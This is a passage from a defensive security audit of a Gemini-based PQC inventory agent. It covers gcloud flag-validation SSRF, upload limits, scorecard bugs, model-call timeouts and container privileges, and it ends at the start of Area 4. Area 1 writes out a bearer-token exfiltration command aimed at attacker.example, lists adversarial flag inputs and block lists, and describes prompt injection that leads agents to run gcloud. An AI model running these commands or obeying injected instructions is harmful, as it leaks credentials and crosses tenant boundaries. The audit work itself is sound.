# Phase 3.0 Architecture & Security Audit — Runtime Resilience and Boundary Hardening

- **Repository:** `g-jsaccomani/pqc_inventory_agent`
- **Audit Branch:** `security-hardening/phase-03-runtime-resilience`
- **Baseline (`main`) Commit SHA:** `62f7247b52effc3f3cf2086a86f06071eea1b6fc`
- **Audit Mode:** Read-only architecture and security audit (**zero runtime code modified in Phase 3.0**)

---

## Executive Summary & Priority Matrix

| Area ID | Audit Domain | Highest Severity | Implementation Priority | Key Confirmed Findings |
| :--- | :--- | :---: | :---: | :--- |
| **P3-01** | Outbound SSRF & Egress Controls | **CRITICAL** | **P0 (Immediate)** | `validate_gcloud_command` validates verbs only, allowing `gcloud --api-endpoint-overrides=...`, `--impersonate-service-account=...`, `--flags-file=...`, `--credential-file-override=...`, and `--log-http` (authenticated SSRF & bearer token exfiltration); silent user-token-to-ADC fallback in `execute_gcloud_command`; redirect-enabled & unbounded `urllib.request.urlopen` calls. |
| **P3-05** | Multimodal Upload Size, MIME & Magic-Byte Validation | **HIGH** | **P0 (Immediate)** | Unbounded `await up_file.read()` and file count in `/api/chat`; zero magic-byte verification; arbitrary binaries fall back to `latin-1` prompt injection; `.docx` ZIP-bomb and `.pdf` page-explosion DoS; unbounded `_UPLOADED_ARTIFACT_CACHE` with cross-tenant key collision via client-chosen `session_id`; unsanitized `filename` passed to `GcsArtifactService`. |
| **P3-03** | PQC Scorecard Denominator Correctness & Edge Cases | **HIGH** | **P1 (High)** | Active `UNKNOWN_REQUIRES_REVIEW` and `EXTERNAL_KEY_MANAGER` keys are omitted from `asym`/`sym` denominators, inflating `weighted_kms_pqc_maturity` to `100.0%`; asymmetric KMS keys lack `key.primary`, causing `versions_listing_error` to mark 100% of asymmetric keys `is_active=False`; TLS KPI ignores `postQuantumKeyExchange=DEFERRED`; partial collection errors do not mark scorecard incomplete. |
| **P3-02** | Vertex AI Timeouts, Retries & Circuit-Breaker Resilience | **HIGH** | **P1 (High)** | No HTTP timeout on `genai.Client` or ADK `GenerateContentConfig`; no wall-clock turn timeout around `runner.run_async()` in `/api/chat` or `main.py`; zero exponential-backoff retries on transient `429`/`503`; zero circuit breaker during regional/global Vertex AI brownouts. |
| **P3-04** | Docker Non-Root Execution & Filesystem Permissions | **MEDIUM-HIGH** | **P1 (High)** | `Dockerfile` runs `uvicorn` and migration jobs as `root` (`UID 0`) with writable `/app`; `gcloud` `$CLOUDSDK_CONFIG`/`$HOME` and `report_exporter.py` `/app/exports` require explicit writable tmp/export paths when transitioning to non-root + read-only `/app`. |

---

## Area 1 (`P3-01`) — Outbound SSRF and Egress Controls

### 1. Current Implementation and Exact File References
- **OAuth & OIDC Outbound HTTP (`urllib.request.urlopen`):**
  - [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L508-L512): `GET https://oauth2.googleapis.com/tokeninfo?id_token=...` (`timeout=8`, unbounded `resp.read()`).
  - [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L557-L561): `GET https://oauth2.googleapis.com/tokeninfo?access_token=...` (`timeout=8`, unbounded `resp.read()`).
  - [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L590-L596): `GET https://www.googleapis.com/oauth2/v3/userinfo` (`timeout=3`, unbounded `resp.read()`).
  - [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L1300-L1306): `POST https://oauth2.googleapis.com/token` (`timeout=10`, unbounded `resp.read()`).
  - [pqc_agent/credential_service.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/credential_service.py#L231-L237): `POST https://oauth2.googleapis.com/token` for refresh-token rotation (`timeout=8`, unbounded `resp.read()`).
  - [pqc_agent/auth_guard.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/auth_guard.py#L413-L465): `_CertCachingRequest` (`google.auth.transport.requests.Request`) for Google/IAP public JWKS retrieval.
- **Subprocess CLI Egress (`gcloud`):**
  - [tools/gcloud_bridge.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcloud_bridge.py#L416-L497): `validate_gcloud_command()` strips flag tokens (`not t.startswith("-")`) before checking `BLOCKED_GCLOUD_VERBS` / `ALLOWED_GCLOUD_VERBS`.
  - [tools/gcloud_bridge.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcloud_bridge.py#L499-L665): `execute_gcloud_command()` invokes `subprocess.run(exec_tokens, timeout=30, env=env, shell=False)` with `CLOUDSDK_AUTH_ACCESS_TOKEN` or Cloud Run ADC.

### 2. Attack Surface and Trust Boundaries
- **Direct API Entrypoint:** Authenticated tenant users can invoke `POST /api/gcloud` ([workspace_server.py:L3502-L3508](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L3502-L3508)) with an arbitrary `command` string.
- **Indirect Prompt-Injection Entrypoint:** Untrusted strings inside uploaded documents or GCP resource labels/display names are read by Gemini agents (`discovery_agent`, `correlation_analyst_agent`), which have tool access to `execute_gcloud_command`.
- **Trust Boundary:** The Cloud Run container holds ambient Workload Identity / Metadata Server (`169.254.169.254`) credentials and handles per-user OAuth 2.0 `cloud-platform.read-only` access tokens. Outbound connections must never be redirectable to attacker-controlled endpoints, internal RFC1918/link-local addresses, or metadata endpoints.

### 3. Existing Security Controls
- `shell=False` and `_FORBIDDEN_SHELL_PATTERNS` block shell command chaining (`;`, `|`, `&`, `` ` ``, `$`, `>`, `<`, `\n`) in `validate_gcloud_command()`.
- Non-flag verbs are restricted to `ALLOWED_GCLOUD_VERBS` and checked against `BLOCKED_GCLOUD_VERBS`.
- OAuth endpoints in `load_oauth_client_config()` ([workspace_server.py:L847-L850](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L847-L850)) are hardcoded constants rather than user-editable database columns.
- Service account impersonation via `/api/connection` is validated by `validate_impersonated_service_account()` and `PQC_ALLOWED_IMPERSONATION_SERVICE_ACCOUNTS`.

### 4. Confirmed Vulnerabilities
1. **[CRITICAL — `P3-01-V1`] Authenticated SSRF & Bearer Token Exfiltration via Unfiltered `gcloud` Flags:**
   - Because [tools/gcloud_bridge.py:L450](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcloud_bridge.py#L450) filters `non_flag_tokens = [t.lower() for t in tokens if not t.startswith("-")]` and never validates `--*` flags, an attacker or prompt-injected agent can execute:
     `gcloud kms keys list --location=global --api-endpoint-overrides=cloudkms=https://attacker.example/capture/`
   - `gcloud` honors `--api-endpoint-overrides` (and `--property=api_endpoint_overrides/...`) and transmits `Authorization: Bearer <token>` (either the user's delegated OAuth token or the Cloud Run Service Account ADC token) directly to `https://attacker.example/capture/` or `http://169.254.169.254/`.
2. **[HIGH — `P3-01-V2`] Dangerous `gcloud` Flag Bypass of Impersonation Allowlist, Local File Read & Token Leakage:**
   - Inline CLI flags `--impersonate-service-account=<arbitrary-sa>` bypass `validate_impersonated_service_account()` in `/api/connection`.
   - `--flags-file=/path/to/file`, `--credential-file-override=/path/to/file`, `--access-token-file=/path/to/file`, and `--configuration=...` allow local file probing and credential override.
   - `--log-http` writes full HTTP request/response headers and payloads into `stderr`, which is returned to the caller and stored in `_GCLOUD_EXECUTION_LOG` ([gcloud_bridge.py:L659-L663](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcloud_bridge.py#L659-L663)).
3. **[HIGH — `P3-01-V3`] Confused-Deputy Fallback from User `access_token` to Server ADC in `execute_gcloud_command`:**
   - At [tools/gcloud_bridge.py:L582-L610](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcloud_bridge.py#L582-L610) and `L630-L647`, when a user in `access_token` mode receives `PERMISSION_DENIED`, `execute_gcloud_command` strips `CLOUDSDK_AUTH_ACCESS_TOKEN` and retries using the server's Cloud Run Service Account ADC. In multi-tenant deployments, a user without IAM permissions on the server's org/project silently escalates to the server SA's permissions.

### 5. Missing Controls
- Strict `gcloud` command-group allowlist (`kms`, `asset`, `compute`, `certificate-manager`, `privateca`, `projects`, `folders`, `organizations`, `iam`, `run`, `container`, `sql`, `storage`) and strict `--flag` allowlist (blocking `--api-endpoint-overrides`, `--property`, `--impersonate-service-account`, `--flags-file`, `--credential-file-override`, `--access-token-file`, `--account`, `--configuration`, `--log-http`, `--http-timeout` abuse).
- Central `safe_google_urlopen()` wrapper enforcing: (a) HTTPS scheme only, (b) exact hostname allowlist (`oauth2.googleapis.com`, `www.googleapis.com`, `openidconnect.googleapis.com`, `accounts.google.com`), (c) DNS/IP check rejecting loopback/private/link-local/metadata IPs (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`, `fe80::/10`), (d) HTTP redirects disabled (`HTTPRedirectHandler` raising on `3xx`), and (e) bounded response read (`<= 64 KiB`).
- Sanitization of inherited `CLOUDSDK_API_ENDPOINT_OVERRIDES_*` and `HTTP_PROXY`/`HTTPS_PROXY` environment variables passed to `gcloud` subprocesses unless explicitly configured by operator policy.

### 6. False-Positive Risks
- Overly restrictive `gcloud` flag filtering could break legitimate PQC diagnostic flags used by `discovery_agent` / `correlation_analyst_agent` (`--project`, `--location`, `--region`, `--zone`, `--scope`, `--organization`, `--folder`, `--keyring`, `--key`, `--asset-types`, `--query`, `--filter`, `--format`, `--limit`, `--page-size`, `--flatten`, `--uri`, `--global`, `--quiet`). Flag allowlisting must explicitly cover these standard read-only query flags.

### 7. Recommended Implementation Approach
1. Introduce `pqc_agent/egress_guard.py` with `safe_urlopen(req, *, timeout, max_bytes=65536, allowed_hosts=...)` using a custom `urllib.request.OpenerDirector` with `NoRedirectHandler`, `https` enforcement, strict hostname allowlist, and bounded byte reads; route all `workspace_server.py` and `credential_service.py` `urlopen` calls through it.
2. Refactor `validate_gcloud_command()` to enforce:
   - Explicit top-level `gcloud` service group allowlist.
   - Explicit flag-name allowlist (parsing `--flag=value` and `--flag value`), unconditionally rejecting `--api-endpoint-overrides`, `--property`, `--flags-file`, `--impersonate-service-account`, `--credential-file-override`, `--access-token-file`, `--configuration`, `--account`, `--log-http`, and any `http://`/`https://` URL inside flag values.
   - Scrub `CLOUDSDK_API_ENDPOINT_OVERRIDES_*` from `subprocess.run` `env`.
3. Remove silent `access_token` -> `adc` fallback in `execute_gcloud_command` when `mode == "access_token"` (fail closed with the user's `PERMISSION_DENIED` so 3LO / tenant boundaries are strictly respected).

### 8. Required Regression and Adversarial Tests
- Adversarial SSRF tests attempting `--api-endpoint-overrides=kms=http://169.254.169.254/`, `--property=api_endpoint_overrides/...`, `--flags-file=/etc/passwd`, `--access-token-file=...`, `--impersonate-service-account=...`, and `--log-http`.
- Redirect-rejection and oversized-response tests on `safe_urlopen()` (`302` to `http://169.254.169.254/computeMetadata/v1/` rejected before second hop; `> 64 KiB` body rejected).
- Regression tests confirming legitimate `gcloud kms`, `gcloud asset`, `gcloud compute ssl-policies`, and `gcloud privateca` read-only commands continue to pass validation.

### 9. Dependencies and Operational Considerations
- Zero new third-party Python packages required (`urllib.request`, `ipaddress`, `urllib.parse` in Python stdlib).
- In Cloud Run production, complement application-level egress guards with Serverless VPC Access / Direct VPC Egress + Cloud Firewall rules restricting egress to Google APIs (`private.googleapis.com` / `restricted.googleapis.com`).

### 10. Severity and Priority
- **Severity:** **CRITICAL** (`P3-01-V1` SSRF + token exfiltration) / **HIGH** (`P3-01-V2`, `P3-01-V3`)
- **Priority:** **P0**

---

## Area 2 (`P3-02`) — Vertex AI Model-Call Timeouts, Retries, and Circuit-Breaker Resilience

### 1. Current Implementation and Exact File References
- [pqc_agent/agent.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/agent.py#L227-L236): `build_generate_content_config()` sets `max_output_tokens=65536`, `temperature`, and `thinking_config` with no `http_options` timeout.
- [pqc_agent/model_registry.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/model_registry.py#L69-L95): `vertex_generate_probe()` creates `genai.Client(vertexai=True, ...)` with no timeout and no retry on transient `429`/`503`.
- [pqc_agent/workspace_server.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L3353-L3392): `/api/chat` iterates `async for event in runner.run_async(...)` with no `asyncio.timeout`, no retry wrapper, and no circuit breaker.
- [main.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/main.py#L109-L118): `run_adk_agent_turn()` runs `runner.run_async(...)` with no timeout or circuit breaker.

### 2. Attack Surface and Trust Boundaries
- **Availability / Worker Exhaustion Surface:** Authenticated users (or burst traffic across tenants) trigger multi-agent turns invoking up to 6 LLM calls (`root_agent` + 5 specialist `AgentTool`s), each configured with `MAX_OUTPUT_TOKENS = 65536`.
- **External Dependency Boundary:** Vertex AI (`aiplatform.googleapis.com` global/regional endpoints) can exhibit high tail latency on preview models (`gemini-3.1-pro-preview*`), transient `429 RESOURCE_EXHAUSTED` quota throttling, or `503 UNAVAILABLE` brownouts.

### 3. Existing Security Controls
- Explicit error reporting without fabricated template fallback ([workspace_server.py:L3409-L3419](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/workspace_server.py#L3409-L3419), HTTP `502` on `MODEL_ERROR`).
- Telemetry capture via `LlmCallTelemetryPlugin` ([pqc_agent/telemetry.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/pqc_agent/telemetry.py)).

### 4. Confirmed Vulnerabilities
1. **[HIGH — `P3-02-V1`] Unbounded Turn & Socket Hang Exhausting Cloud Run Workers:**
   - Neither `GenerateContentConfig.http_options` nor `runner.run_async()` enforces a timeout. Stalled upstream streams hold coroutines and Cloud Run concurrency slots indefinitely.
2. **[MEDIUM-HIGH — `P3-02-V2`] Zero Retry with Exponential Backoff + Jitter on Transient `429`/`503`:**
   - Parallel specialist invocations (`ROOT_INSTRUCTION` lines `69-74` explicitly instructs calling specialists in parallel) spike concurrent Vertex AI requests per turn; a single `429` immediately aborts the turn or specialist output.
3. **[MEDIUM-HIGH — `P3-02-V3`] Missing Circuit Breaker Under Sustained Vertex AI Outage:**
   - During a regional/model outage, every incoming `/api/chat` request continues issuing live upstream calls until timeout, causing cascading worker saturation instead of failing fast (`503 MODEL_CIRCUIT_OPEN`) with `Retry-After`.

### 5. Missing Controls
- Per-LLM HTTP request timeout (`PQC_VERTEX_HTTP_TIMEOUT_SECONDS`, e.g. `120s` for full generation, `15s` for health probes) via `types.HttpOptions(timeout=...)`.
- Per-turn wall-clock timeout (`PQC_AGENT_TURN_TIMEOUT_SECONDS`, e.g. `240s`) via `asyncio.timeout()` around `runner.run_async()` in both `workspace_server.py` and `main.py`, returning structured `504` / `MODEL_TIMEOUT` JSON without leaking stack traces.
- Bounded retry policy (`max_attempts=3`, exponential backoff + full jitter, strictly for idempotent transient `429`/`502`/`503`/`504`/network timeout errors, bounded by the outer turn budget).
- Per-model thread-safe / async-safe Circuit Breaker (`CLOSED` -> `OPEN` after `N` consecutive transient failures within window -> `HALF_OPEN` single trial after cooldown `PQC_VERTEX_CIRCUIT_COOLDOWN_SECONDS`).
- *(Future Scope Note — Out of Scope for Phase 3 per instructions)*: `ModelRegistry` negative-cache TTL (`21600s` on transient startup failure) and Last-Known-Good (LKG) catalog persistence should be tracked as a separate future Model Registry decision, not redesigned in Phase 3.

### 6. False-Positive Risks
- Full 5-phase PQC assessments with `HIGH` thinking level legitimately take `45–150s` across coordinator + specialist agents. Setting per-call or per-turn timeouts too aggressively (e.g. `< 30s`) will cause false timeouts on valid enterprise assessments.
- Circuit breakers MUST NOT trip on `400 INVALID_ARGUMENT` (e.g. bad user input / unsupported MIME) or `401`/`403` user credential errors — only on upstream availability/quota failures (`429`, `500`, `502`, `503`, `504`, `TimeoutError`).

### 7. Recommended Implementation Approach
1. Add `pqc_agent/resilience.py` implementing:
   - Configurable timeouts (`PQC_VERTEX_PROBE_TIMEOUT_SECONDS=15`, `PQC_VERTEX_REQUEST_TIMEOUT_SECONDS=120`, `PQC_AGENT_TURN_TIMEOUT_SECONDS=240`).
   - `VertexCircuitBreaker` keyed by `model_name` (configurable `failure_threshold=5`, `recovery_timeout_seconds=30`, counting only transient `429`/`5xx`/timeout errors).
   - Bounded retry helper with full jitter respecting remaining turn deadline.
2. Wire `types.HttpOptions(timeout=...)` into `build_generate_content_config()` and `vertex_generate_probe()` (note `google-genai` `HttpOptions.timeout` unit convention — verify milliseconds vs seconds in installed `google-genai` SDK during implementation!).
3. Wrap `runner.run_async()` in `workspace_server.py` and `main.py` with `VertexCircuitBreaker` check + `asyncio.timeout()`.

### 8. Required Regression and Adversarial Tests
- Simulated hung LLM generator exceeding `PQC_AGENT_TURN_TIMEOUT_SECONDS` terminates promptly with structured `MODEL_TIMEOUT` (`504`/`502`) and releases resources.
- Transient `429`/`503` recovers on retry within budget; non-retryable `400` fails immediately without retry amplification (`1` attempt) and does NOT trip circuit breaker.
- Consecutive `503`/timeout failures open the circuit for that model (`MODEL_CIRCUIT_OPEN`), fast-failing subsequent turns in `< 5ms`, then transitioning through `HALF_OPEN` -> `CLOSED` after cooldown when health recovers.

### 9. Dependencies and Operational Considerations
- Verify `Cloud Run --timeout` in `scripts/deploy_cloud_run.sh` and `scripts/setup_and_deploy_vertex.sh` (`300s` or `360s`) exceeds `PQC_AGENT_TURN_TIMEOUT_SECONDS` (`240s`) so the application always returns a clean JSON timeout before Cloud Run's proxy severs the socket.
- Verify exact `google.genai.types.HttpOptions.timeout` unit (milliseconds in `google-genai >= 1.x`).

### 10. Severity and Priority
- **Severity:** **HIGH**
- **Priority:** **P1**

---

## Area 3 (`P3-03`) — PQC Scorecard Denominator Correctness and Edge Cases

### 1. Current Implementation and Exact File References
- [tools/gcp_inventory.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L157-L158): `ASYMMETRIC_FAMILIES` and `SYMMETRIC_FAMILIES` sets.
- [tools/gcp_inventory.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L302-L310): `_ratio_metric(numerator, denominator, definition)` returns `value_pct=None` when `denominator == 0`.
- [tools/gcp_inventory.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L457-L532): `build_key_record()` (`is_active` determination and downgrade-aware `effective` algorithm selection).
- [tools/gcp_inventory.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L543-L611): `_inspect_single_kms_key()`.
- [tools/gcp_inventory.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L1085-L1213): `compute_scorecard_from_keys()` and `compute_pqc_scorecard()`.
- [tools/pqc_detectors.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/pqc_detectors.py#L125-L163) & [L281-L304](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/pqc_detectors.py#L281-L304): TLS proxy and BYOK import-job classification feeding scorecard metrics.

### 2. Attack Surface and Trust Boundaries
- **Integrity / Executive Decision Surface:** CISOs, auditors, and `quantum_risk_agent` rely on `compute_pqc_scorecard` as deterministic, auditable truth (`ROOT_INSTRUCTION` rule 3: *"Use scorecard numbers exactly as computed, always with numerator and denominator"*). Any silent denominator drop inflates PQC readiness percentages and masks unreviewed or vulnerable production keys.

### 3. Existing Security Controls
- `_ratio_metric()` safely handles `denominator == 0` (`value_pct = None`, no `ZeroDivisionError`).
- `classify_algorithm()` classifies unrecognized algorithms as `UNKNOWN_REQUIRES_REVIEW` (`QUANTUM_STATUS_RANK = 1`), and `build_key_record()` picks `min(..., key=QUANTUM_STATUS_RANK)` across template and enabled versions (downgrade-aware).

### 4. Confirmed Vulnerabilities / Correctness Defects
1. **[HIGH — `P3-03-V1`] Active `UNKNOWN_REQUIRES_REVIEW` and `EXTERNAL_KEY_MANAGER` Keys Omitted from KPI Denominators (Score Inflation to `100.0%`):**
   - In [tools/gcp_inventory.py:L1095-L1100](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L1095-L1100), `asym` filters `family(k) in ASYMMETRIC_FAMILIES` and `sym` filters `family(k) in SYMMETRIC_FAMILIES`.
   - Active keys with `algorithm_family` in `{"UNKNOWN", "UNRECOGNIZED", "EXTERNAL_KEY_MANAGER"}` (e.g., an `ASYMMETRIC_SIGN` key with `UNKNOWN_ALGORITHM` or an `ENCRYPT_DECRYPT` Cloud EKM key `EXTERNAL_SYMMETRIC_ENCRYPTION`) are excluded from `asym`, `sym`, and `sym_encrypt`.
   - Because `weighted_kms_pqc_maturity` ([L1123-L1135](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L1123-L1135)) averages only `asymmetric_pqc_migration`, `symmetric_quantum_resistance`, and `symmetric_rotation_hygiene`, a scope with 1 active `ML_KEM_768` key and 50 active `UNKNOWN_ALGORITHM` or `EXTERNAL_SYMMETRIC_ENCRYPTION` keys reports **`weighted_kms_pqc_maturity = 100.0%`** while `algorithmic_quantum_safe = 2.0%` (`1/51`)!
2. **[HIGH — `P3-03-V2`] Asymmetric Keys Falsely Marked `is_active = False` When `list_crypto_key_versions` Fails:**
   - In Google Cloud KMS, asymmetric `CryptoKey` resources (`ASYMMETRIC_SIGN`, `ASYMMETRIC_DECRYPT`, `KEY_ENCAPSULATION`) **never populate `key.primary`** (`primary_state` is `"NO_PRIMARY"` at [L566](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L566)).
   - At [L484-L486](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L484-L486), `if versions_listing_error: is_active = primary == "ENABLED"` evaluates to `False` for **every asymmetric key** whenever `cloudkms.cryptoKeyVersions.list` fails (`PERMISSION_DENIED` or transient error), silently erasing all asymmetric keys from `active` and from all scorecard denominators!
3. **[MEDIUM — `P3-03-V3`] `symmetric_rotation_hygiene` Definition vs Denominator Mismatch on EKM / Unknown `ENCRYPT_DECRYPT` Keys:**
   - [L1116](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L1116) states `"all active ENCRYPT_DECRYPT keys"`, but [L1099](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L1099) filters `sym` (`SYMMETRIC_FAMILIES` only), omitting `EXTERNAL_SYMMETRIC_ENCRYPTION` and `UNKNOWN` `ENCRYPT_DECRYPT` keys without documenting EKM exclusion or counting unverified keys conservatively.
4. **[MEDIUM — `P3-03-V4`] TLS Scorecard Metric Ignores `postQuantumKeyExchange = DEFERRED`:**
   - [L1195-L1198](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcp_inventory.py#L1195-L1198) counts any proxy with `effective_requires_tls_1_3 == True` as compliant, even if its SSL policy explicitly sets `post_quantum_key_exchange == "DEFERRED"` (which disables hybrid PQC `X25519MLKEM768` on TLS 1.3!).
5. **[MEDIUM — `P3-03-V5`] Partial Inventory Errors Do Not Flag Scorecard Completeness:**
   - When `collection_errors` is non-empty (e.g., partial project/location `PERMISSION_DENIED`), `compute_pqc_scorecard` emits KPI percentages with no top-level `inventory_complete: False` / `completeness_status: "PARTIAL"` indicator.

### 5. Missing Controls
- Purpose-aware fallback classification so active keys with `UNKNOWN`/`UNRECOGNIZED` family are routed into the appropriate asymmetric (`ASYMMETRIC_SIGN`, `ASYMMETRIC_DECRYPT`, `KEY_ENCAPSULATION`, `RAW_ENCRYPT_DECRYPT` if asymmetric) or symmetric (`ENCRYPT_DECRYPT`, `MAC`) denominator (with `0` credit in the numerator!), and any key with unknown purpose still penalizes `weighted_kms_pqc_maturity` (or caps/penalizes maturity via `algorithmic_quantum_safe`).
- Conservative `is_active` handling when `versions_listing_error` is present on asymmetric keys (`primary == "NO_PRIMARY"` + `versions_listing_error` -> treat as active/unverified `UNKNOWN_REQUIRES_REVIEW` or explicitly `activity_unknown_assumed_active = True`, never silently inactive!).
- Explicit TLS PQC readiness KPI (requiring `effective_requires_tls_1_3 and not effective_post_quantum_key_exchange_deferred`).
- Explicit `completeness_status` (`"COMPLETE"` vs `"PARTIAL_WITH_COLLECTION_ERRORS"` vs `"EMPTY_SCOPE"`) on scorecard output.

### 6. False-Positive Risks
- Treating `DESTROYED` or `DISABLED` asymmetric keys as active: note that when `versions_listing_error` is `None` (normal path), an asymmetric key with zero `ENABLED` versions (`enabled_version_ids == []`) IS genuinely inactive (`is_active = False`) and MUST remain excluded from active denominators. Only when `versions_listing_error` prevented checking versions should asymmetric keys (`NO_PRIMARY`) be conservatively assumed active!
- Cloud EKM (`EXTERNAL_SYMMETRIC_ENCRYPTION`) keys are rotated in the external key manager rather than via GCP KMS `rotation_period`; either include them in `symmetric_quantum_resistance` as `UNKNOWN_REQUIRES_REVIEW` (`0` numerator) and track `external_ekm_keys` explicitly in rotation hygiene notes so customers using EKM are neither given false `100%` algorithmic assurance nor false rotation errors without explanation.

### 7. Recommended Implementation Approach
1. Partition active KMS keys exhaustively using `(algorithm_family, purpose)` so **every** active key (`len(active)`) belongs to asymmetric, symmetric/MAC, or uncategorized-review denominators — guaranteeing `asym + sym + unknown_purpose == active` and ensuring `UNKNOWN_REQUIRES_REVIEW` / `EXTERNAL_KEY_MANAGER` keys are counted in denominators (never silently dropped).
2. Fix `build_key_record()` when `versions_listing_error` is set: if `purpose_upper in ("ASYMMETRIC_SIGN", "ASYMMETRIC_DECRYPT", "KEY_ENCAPSULATION")` and `primary == "NO_PRIMARY"`, set `is_active = True` and `activity_assumed_due_to_version_error = True`.
3. Add `https_proxies_pqc_ready_tls_1_3` (or tighten TLS KPI alongside `https_proxies_requiring_tls_1_3`) checking `effective_requires_tls_1_3 and not effective_post_quantum_key_exchange_deferred`, and add `completeness_status` (`COMPLETE` / `PARTIAL_WITH_ERRORS`).

### 8. Required Regression and Adversarial Tests
- Zero keys in scope (`keys=[]`), asymmetric-only scope (`sym=[]`), symmetric-only scope (`asym=[]`), MAC-only scope (`sym_encrypt=[]`) -> zero `ZeroDivisionError`, `value_pct is None`, weights renormalized accurately.
- Scope with `1` `ML_KEM_768` key + `10` `UNKNOWN_ALGORITHM` `ASYMMETRIC_SIGN` keys -> `asymmetric_pqc_migration` = `1/11` (`9.1%`), NOT `100.0%`!
- Scope with `EXTERNAL_SYMMETRIC_ENCRYPTION` keys -> included in symmetric denominator (`0` numerator, `UNKNOWN_REQUIRES_REVIEW`), never inflating score to `100.0%`.
- Asymmetric RSA key with `versions_listing_error="PermissionDenied: 403"` and `primary_state="NO_PRIMARY"` -> `is_active is True` and counted as Shor-vulnerable in scorecard!
- Mixed key versions (`template=ML_DSA_65` + enabled `RSA_SIGN_PSS_2048_SHA256` version) -> downgrade-aware `QUANTUM_VULNERABLE_SHOR` (`0` numerator).
- TLS proxy with `TLS_1_3` + `post_quantum_key_exchange="DEFERRED"` -> flagged non-PQC-ready; partial `collection_errors` -> `completeness_status == "PARTIAL_WITH_ERRORS"`.

### 9. Dependencies and Operational Considerations
- Check existing assertions in `tests/test_pqc_inventory.py::test_scorecard_is_reproducible_with_numerators_and_denominators` to ensure demo dataset (`mock_data.py`) KPI expectations remain backward-compatible or explicitly verified.

### 10. Severity and Priority
- **Severity:** **HIGH**
- **Priority:** **P1**

---

## Area 4 (`P3-04`) — Docker Non-Root Execution and Filesystem Permissions

### 1. Current Implementation and Exact File References
- [Dockerfile](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/Dockerfile#L1-L57): `FROM python:3.12-slim`, installs `google-cloud-cli`, creates `/app/exports`, copies code into `/app`, `chmod 0755` on migration scripts, and runs `CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8080"]` with **no `USER` directive (executes as `root` UID `0`)**.
- [tools/report_exporter.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/report_exporter.py#L393-L395) & [L426-L431](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/report_exporter.py#L426-L431): Writes `.md` and `.html` reports to `PQC_EXPORT_DIR` (defaults to `exports`, i.e., `/app/exports`).
- [tools/gcloud_bridge.py](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/tools/gcloud_bridge.py#L556-L581): Executes `gcloud` subprocess inheriting `HOME` / `CLOUDSDK_CONFIG`.
- [scripts/setup_and_deploy_vertex.sh](file:///Users/jsaccomani/Documents/Jetsky/My%20Projects/agentic_pqc_inventory/scripts/setup_and_deploy_vertex.sh#L118-L140): Runs Cloud Run migration job (`python scripts/run_db_migrations.py --require-postgres`) using the same container image.

### 2. Attack Surface and Trust Boundaries
